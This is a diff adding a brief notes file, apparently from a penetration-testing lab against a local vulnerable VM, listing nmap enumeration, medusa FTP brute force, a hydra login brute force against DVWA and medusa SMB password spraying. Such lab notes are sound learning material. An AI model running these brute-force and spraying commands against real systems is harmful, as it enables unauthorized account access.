@@ -1,1 +1,13 @@
+Commands Used
 
+Network Enumeration
+nmap -sV 192.168.56.102
+
+FTP Brute Force
+medusa -h 192.168.56.102 -u msfadmin -P passwords.txt -M ftp
+
+DVWA Brute Force
+hydra -l admin -P passwords.txt 192.168.56.102 http-get-form '/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: security=low; PHPSESSID=SESSION:F=Username and/or password incorrect.'
+
+SMB Password Spraying
+medusa -h 192.168.56.102 -U users.txt -P smb_passwords.txt -M smbnt
